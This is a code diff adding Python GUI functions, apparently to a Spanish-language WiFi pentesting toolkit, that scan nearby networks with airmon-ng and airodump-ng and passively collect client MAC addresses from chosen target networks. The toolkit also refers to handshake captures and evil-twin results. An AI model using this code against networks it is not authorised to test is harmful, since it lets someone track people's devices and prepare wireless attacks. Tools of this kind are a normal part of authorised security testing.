+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            mon_2g = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
+            self.wifi_state["mon_iface_2g"] = mon_2g
+
+            mon_5g = None
+            if mode == 'dual' and iface_5g:
+                subprocess.run(["sudo", "airmon-ng", "start", iface_5g], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                mon_5g = f"{iface_5g}mon" if os.path.exists(f"/sys/class/net/{iface_5g}mon") else iface_5g
+                self.wifi_state["mon_iface_5g"] = mon_5g
+
+            self.after(0, lambda: self.escribir_consola(f"[*] Escaneando espectro (20s)..."))
+
+            procs = []
+            cmd_2g = f"sudo timeout -k 5 20s airodump-ng {mon_2g} -w {scan_prefix_2g} --output-format csv"
+            procs.append(subprocess.Popen(cmd_2g, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+
+            if mode == 'dual' and mon_5g:
+                cmd_5g = f"sudo timeout -k 5 20s airodump-ng {mon_5g} -w {scan_prefix_5g} --output-format csv"
+                procs.append(subprocess.Popen(cmd_5g, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+
+            for p in procs: p.wait()
+
+            redes = []
+            iface_map = {}
+
+            def parsear_csv(prefix, mon_iface):
+                try:
+                    with open(f"{prefix}-01.csv", "r", errors="ignore") as f:
+                        partes = f.read().split("Station MAC,")
+                        for linea in partes[0].split("\n")[2:]:
+                            r = linea.split(",")
+                            if len(r) >= 14 and ":" in r[0]:
+                                ch = r[3].strip()
+                                bssid = r[0].strip()
+                                essid = r[13].strip() or "<Oculta>"
+                                banda = '2.4GHz' if int(ch) <= 14 else '5GHz'
+                                redes.append({"bssid": bssid, "ch": ch, "essid": essid, "banda": banda})
+                                iface_map[bssid] = mon_iface
+                except Exception: pass
+                finally:
+                    for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                        try: os.remove(f"{prefix}{ext}")
+                        except: pass
+
+            parsear_csv(scan_prefix_2g, mon_2g)
+            if mode == 'dual' and scan_prefix_5g: parsear_csv(scan_prefix_5g, mon_5g)
+
+            # Remover BSSIDs duplicados y ordenar por banda
+            redes_unicas = list({v['bssid']:v for v in redes}.values())
+            self.after(0, lambda: self._wifi_client_show_networks(redes_unicas, iface_map))
+
+        threading.Thread(target=escanear, daemon=True).start()
+
+    def _wifi_client_show_networks(self, redes, iface_map):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_list)
+        ttk.Label(self.main_frame, text="RED OBJETIVO", style='Title.TLabel').pack(pady=2)
+
+        if not redes:
+            ttk.Label(self.main_frame, text="No hay redes detectadas.", style='Dark.TLabel').pack(pady=10)
+            return
+
+        mode = self.wifi_state.get("client_scan_mode", "single")
+        scroll = ScrollableFrame(self.main_frame, max_items=80)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        if mode == 'dual':
+            # --- MODO DUAL: selección de hasta 2 redes ---
+            state = self.wifi_state["dual_client"]
+            state["selected_networks"] = []  # (red, iface_mon)
+            state["network_btns"] = []
+
+            # Etiqueta para mostrar las selecciones actuales
+            self.lbl_dual_selected = ttk.Label(scroll.scrollable_frame,
+                                            text="Seleccionadas: 0 de 2",
+                                            style='Mono.TLabel',
+                                            foreground=COLOR_TEXTO_ADVERTENCIA)
+            self.lbl_dual_selected.pack(anchor='w', padx=5, pady=(5,0))
+
+            # Botón de inicio (deshabilitado hasta que haya 2)
+            self.btn_dual_enum = ttk.Button(scroll.scrollable_frame,
+                                            text="Iniciar Enumeración Dual (2 redes)",
+                                            style='Gray.TButton',
+                                            command=self._wifi_client_dual_start_enumeration,
+                                            state='disabled')
+            self.btn_dual_enum.pack(pady=5, fill='x', padx=20)
+
+            # Mostrar las redes agrupadas por banda
+            for red in sorted(redes, key=lambda x: (x['banda'], x['essid'])):
+                mon_asociada = iface_map.get(red['bssid'])
+                btn = ttk.Button(scroll.scrollable_frame,
+                                text=f"{red['essid']} (Ch:{red['ch']}, {red['banda']})",
+                                style='Gray.TButton',
+                                command=lambda r=red, m=mon_asociada: self._wifi_client_dual_network_selected(r, m))
+                btn.pack(fill='x', padx=10, pady=3)
+                state["network_btns"].append(btn)
+
+        else:
+            # --- MODO SINGLE (comportamiento original) ---
+            for red in sorted(redes, key=lambda x: (x['banda'], x['essid'])):
+                texto = f"{red['essid']} (Ch:{red['ch']}, {red['banda']})"
+                mon_asociada = iface_map.get(red['bssid'])
+                scroll.add_button(
+                    text=texto,
+                    command=lambda r=red, m=mon_asociada: self._wifi_client_select_target(r, m),
+                    style='Gray.TButton', width=28
+                )
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        gc.collect()
+
+    def _wifi_client_dual_network_selected(self, red, iface_mon):
+        state = self.wifi_state["dual_client"]
+        selected = state.setdefault("selected_networks", [])
+        if any(r['bssid'] == red['bssid'] for r, _ in selected) or len(selected) >= 2:
+            return
+        selected.append((red, iface_mon))
+        count = len(selected)
+        if hasattr(self, 'lbl_dual_selected'):
+            self.lbl_dual_selected.config(text=f"Seleccionadas: {count} de 2")
+        self.escribir_consola(f"[*] Red añadida: {red['essid']} ({red['banda']})")
+        if count == 2:
+            self.btn_dual_enum.config(style='Red.TButton', state='normal')
+
+    def _wifi_client_dual_start_enumeration(self):
+        state = self.wifi_state["dual_client"]
+        selected = state["selected_networks"]
+        if len(selected) != 2:
+            self.escribir_consola("[!] Seleccione exactamente 2 redes.")
+            return
+
+        # Deshabilitar botones de selección y de inicio
+        self.btn_dual_enum.config(state='disabled', style='Gray.TButton')
+        for btn in state.get("network_btns", []):
+            btn.config(state='disabled')
+
+        # Cambiar a pantalla de "Enumerando..." con botón Detener
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_list)
+        ttk.Label(self.main_frame, text="ENUMERANDO DUAL (30s)...", style='Title.TLabel').pack(pady=5)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=5)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        self.btn_detener_client_enum = scroll.add_button(text="DETENER ENUMERACIÓN",
+                                                        command=self._wifi_client_enum_stop,
+                                                        style='Danger.TButton', width=28)
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+        self.escribir_consola("[*] Iniciando enumeración dual...")
+
+        # Lanzar hilo de enumeración dual
+        def enum_dual():
+            clientes_totales = []
+            timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+            session_dir = os.path.join(BASE_DIR_CLIENTS, f"Clientes_Dual-{timestamp}")
+            os.makedirs(session_dir, exist_ok=True)
+
+            def capturar(red, iface_mon, idx):
+                prefix = f"/tmp/dual_client_{idx}_{os.getpid()}"
+                subprocess.run(["sudo", "iw", "dev", iface_mon, "set", "channel", red['ch']],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                proc = subprocess.Popen(
+                    f"sudo timeout -k 5 30s airodump-ng --bssid {red['bssid']} -c {red['ch']} {iface_mon} -w {prefix} --output-format csv",
+                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                proc.wait()
+                if self.enum_proc is None:   # detenido desde fuera
+                    return None, []
+                clients = []
+                try:
+                    with open(f"{prefix}-01.csv", "r", errors="ignore") as f:
+                        partes = f.read().split("Station MAC,")
+                        if len(partes) > 1:
+                            for linea in partes[1].split("\n")[1:]:
+                                c = linea.split(",")
+                                if len(c) >= 6 and ":" in c[0]:
+                                    clients.append(c[0].strip())
+                except Exception:
+                    pass
+                finally:
+                    for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                        try: os.remove(f"{prefix}{ext}")
+                        except: pass
+                return red, clients
+
+            threads = []
+            results = [None, None]
+            for i, (red, mon) in enumerate(selected):
+                t = threading.Thread(target=lambda idx=i, r=red, m=mon: results.__setitem__(idx, capturar(r, m, idx)))
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join()
+
+            if self.enum_proc is None:   # detención manual
+                return
+
+            clientes_totales = [(r, c) for r, c in results if r is not None]
+
+            with open(os.path.join(session_dir, "clientes_dual.txt"), "w") as f:
+                for red, macs in clientes_totales:
+                    f.write(f"\n=== {red['essid']} ({red['banda']}, CH{red['ch']}) ===\n")
+                    f.write("\n".join(macs) if macs else "Sin clientes detectados\n")
+                    f.write("\n")
+
+            self.after(0, lambda: self._wifi_client_dual_show_results(clientes_totales))
+
+        self.enum_proc = True   # marcador de que hay un proceso activo
+        threading.Thread(target=enum_dual, daemon=True).start()
+
+    def _wifi_client_dual_show_results(self, resultados):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)   # botón atrás también restaura
+        ttk.Label(self.main_frame, text="RESULTADOS DUAL", style='Title.TLabel').pack(pady=2)
+
+        # Reducimos los items ya que los datos visuales pasarán a estar en la consola inferior
+        scroll = ScrollableFrame(self.main_frame, max_items=15)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        def action_save_restore():
+            # Bloquear botón para que se ponga gris y no se pueda pulsar dos veces
+            btn_save.config(style='Gray.TButton')
+            btn_save.state(['disabled'])
+            
+            # Restaurar la interfaz (los datos de dualband ya se guardaron en background)
+            self._wifi_client_restore()
+
+        # Botón que restaura la red y vuelve al menú WiFi
+        btn_save = scroll.add_button(text="Guardar y volver al menú", command=action_save_restore, style='Red.TButton', width=28)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        self.escribir_consola("[+] Enumeración dual completada. Datos guardados en Resultados_Clientes/")
+        
+        # Inyectar todos los resultados en la terminal roja
+        for red, macs in resultados:
+            self.escribir_consola(f"\n[+] {red['essid']} ({red['banda']}) - {len(macs)} clientes")
+            if macs:
+                for mac in macs:
+                    self.escribir_consola(f"  -> {mac}")
+            else:
+                self.escribir_consola("  -> (ninguno)")
+
+        gc.collect()
+
+    def _wifi_client_select_target(self, red, iface_mon):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_list)
+        ttk.Label(self.main_frame, text="CONFIRMAR ENUMERACIÓN", style='Title.TLabel').pack(pady=2)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        info = f"ESSID: {red['essid']}\nBSSID: {red['bssid']}\nCanal: {red['ch']} ({red['banda']})"
+        ttk.Label(scroll.scrollable_frame, text=info, style='Mono.TLabel', justify='center').pack(pady=10)
+
+        self.client_scan_btns = []
+        btn_iniciar = scroll.add_button(text="Iniciar Enumeración (30s)",
+                                        command=lambda: self._wifi_client_start_enum(red, iface_mon),
+                                        style='Red.TButton', width=28)
+        self.client_scan_btns.append(btn_iniciar)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+    def _wifi_client_start_enum(self, red, iface_mon):
+        """Muestra pantalla con botón Detener y ejecuta la enumeración."""
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_list)  # no se puede volver atrás mientras ataca, pero mantenemos referencia
+        ttk.Label(self.main_frame, text="ENUMERANDO CLIENTES...", style='Title.TLabel').pack(pady=5)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=5)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        # Botón Detener
+        self.btn_detener_client_enum = scroll.add_button(text="DETENER ENUMERACIÓN",
+                                                        command=self._wifi_client_enum_stop,
+                                                        style='Danger.TButton', width=28)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+        # Iniciar escaneo en hilo
+        self._wifi_client_enum_run(red, iface_mon)
+
+    def _wifi_client_enum_run(self, red, iface_mon):
+        """Hilo de enumeración."""
+        scan_prefix = self._generar_nombre_temporal("client_enum")
+        self.escribir_consola(f"[*] Recopilando MACs pasivamente (30s)...")
+
+        def run():
+            subprocess.run(["sudo", "iw", "dev", iface_mon, "set", "channel", str(red['ch'])],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.enum_proc = subprocess.Popen(
+                f"sudo timeout -k 5 30s airodump-ng --bssid {red['bssid']} -c {red['ch']} {iface_mon} -w {scan_prefix} --output-format csv",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            self.enum_proc.wait()
+
+            if self.enum_proc is None:  # fue detenido manualmente
+                return
+
+            clientes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    if len(partes) > 1:
+                        for linea in partes[1].split("\n")[1:]:
+                            c = linea.split(",")
+                            if len(c) >= 6 and ":" in c[0]:
+                                clientes.append(c[0].strip())
+            except Exception:
+                pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            # Ya no guardamos el archivo aquí, solo enviamos la info a la vista final
+            self.enum_proc = None
+            self.after(0, lambda: self._wifi_client_show_results(clientes, red))
+
+        threading.Thread(target=run, daemon=True).start()
+
+
+    def _wifi_client_enum_stop(self):
+        # ... deshabilitar botón ...
+        if hasattr(self, 'enum_proc') and self.enum_proc:
+            # Si es un subprocess.Popen (single) lo terminamos
+            if hasattr(self.enum_proc, 'terminate'):
+                try:
+                    self.enum_proc.terminate()
+                    self.enum_proc.wait(timeout=3)
+                except:
+                    self.enum_proc.kill()
+            # En dual, enum_proc es True (solo indicador), matamos airodump-ng por nombre
+            else:
+                subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.enum_proc = None
+
+        subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self._wifi_client_restore()
+
+    def _wifi_client_enumerate(self, red, iface_mon):
+        for btn in getattr(self, 'client_scan_btns', []):
+            if btn.winfo_exists():
+                btn.config(style='Gray.TButton')
+                btn.state(['disabled'])
+
+        if hasattr(self, 'btn_detener_client_enum') and self.btn_detener_client_enum.winfo_exists():
+            self.btn_detener_client_enum.config(style='Danger.TButton')
+            self.btn_detener_client_enum.state(['!disabled'])
+
+        self.escribir_consola(f"[*] Recopilando MACs pasivamente (30s)...")
+
+        scan_prefix = self._generar_nombre_temporal("client_enum")
+
+        def enum_thread():
+            subprocess.run(["sudo", "iw", "dev", iface_mon, "set", "channel", str(red['ch'])], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.enum_proc = subprocess.Popen(f"sudo timeout -k 5 30s airodump-ng --bssid {red['bssid']} -c {red['ch']} {iface_mon} -w {scan_prefix} --output-format csv", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.enum_proc.wait()
+
+            clientes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    if len(partes) > 1:
+                        for linea in partes[1].split("\n")[1:]:
+                            c = linea.split(",")
+                            if len(c) >= 6 and ":" in c[0]:
+                                clientes.append(c[0].strip())
+            except Exception: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+            res_dir = os.path.join(BASE_DIR_CLIENTS, f"Clientes-{timestamp}")
+            os.makedirs(res_dir, exist_ok=True)
+            with open(os.path.join(res_dir, "clientes.txt"), "w") as f:
+                f.write(f"ESSID: {red['essid']}\nBSSID: {red['bssid']}\n\nCLIENTES CONECTADOS:\n")
+                f.write("\n".join(clientes) if clientes else "No se detectaron clientes activos.")
+
+            self.enum_proc = None
+            self.after(0, lambda: self._wifi_client_show_results(clientes, red))
+
+        threading.Thread(target=enum_thread, daemon=True).start()
+
+    def _wifi_client_detener(self):
+        self.escribir_consola("\n[!] Abortando enumeración de clientes...")
+        if hasattr(self, 'btn_detener_client_enum') and self.btn_detener_client_enum.winfo_exists():
+            self.btn_detener_client_enum.config(style='Gray.TButton')
+            self.btn_detener_client_enum.state(['disabled'])
+
+        if hasattr(self, 'enum_proc') and self.enum_proc:
+            try:
+                self.enum_proc.terminate()
+            except:
+                self.enum_proc.kill()
+        subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    def _wifi_client_show_results(self, clientes, red):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._wifi_client_restore)
+        ttk.Label(self.main_frame, text="CLIENTES ENCONTRADOS", style='Title.TLabel').pack(pady=2)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=50)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        if not clientes:
+            ttk.Label(scroll.scrollable_frame, text="0 clientes detectados.", style='Dark.TLabel').pack(pady=10)
+        else:
+            for mac in clientes:
+                scroll.add_button(text=f"{mac} (Desconocido)", command=lambda: None, style='Gray.TButton', width=28)
+
+        # Lógica anidada que se ejecuta estrictamente al pulsar el botón
+        def action_save_restore():
+            # 1. Bloquear el botón instantáneamente (Gris + Desactivado)
+            btn_save.config(style='Gray.TButton')
+            btn_save.state(['disabled'])
+
+            # 2. Proceder a crear el directorio y archivo de guardado de forma segura
+            try:
+                timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+                # Estandarizado con el prefijo Clientes_Single para asegurar consistencia en el explorador
+                res_dir = os.path.join(BASE_DIR_CLIENTS, f"Clientes_Single-{timestamp}")
+                os.makedirs(res_dir, exist_ok=True)
+                
+                with open(os.path.join(res_dir, "clientes.txt"), "w") as f:
+                    f.write(f"ESSID: {red['essid']}\nBSSID: {red['bssid']}\n\nCLIENTES CONECTADOS:\n")
+                    f.write("\n".join(clientes) if clientes else "No se detectaron clientes activos.")
+                
+                self.escribir_consola(f"[+] Resultados guardados en {res_dir}/")
+            except Exception as e:
+                self.escribir_consola(f"[!] Error de escritura al guardar: {e}")
+
+            # 3. Restaurar NetworkManager y la conexión WiFi
+            self._wifi_client_restore()
+
+        # Botón con la lógica vinculada estandarizada
+        btn_save = scroll.add_button(text="Guardar y volver", command=action_save_restore, style='Red.TButton', width=28)
+        
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+        self.escribir_consola(f"[+] Total clientes: {len(clientes)}. Pulse Guardar y volver.")
+        gc.collect()
+
+    def _wifi_client_restore(self):
+        self.escribir_consola("[*] Deteniendo monitor y restaurando red...")
+        def restore():
+            subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            for key in ["mon_iface_2g", "mon_iface_5g"]:
+                mon = self.wifi_state.get(key)
+                if mon:
+                    subprocess.run(["sudo", "airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.after(0, self.show_wifi_menu)
+        threading.Thread(target=restore, daemon=True).start()
+
+
 
     def _wifi_explorar_handshakes(self):
         self._mostrar_explorador_generico(BASE_DIR_WIFI, "CAPTURAS", self.show_wifi_menu)
 
     def _wifi_explorar_evil(self):
         self._mostrar_explorador_generico(BASE_DIR_EVIL, "EVIL TWIN RES", self.show_wifi_menu)
+
+    def _wifi_explorar_clientes(self):
+        self._mostrar_explorador_generico(BASE_DIR_CLIENTS, "CLIENTES RES", self.show_wifi_menu)
 
     def _mostrar_explorador_generico(self, base_dir, titulo, callback_volver):
         self.limpiar_main_frame()
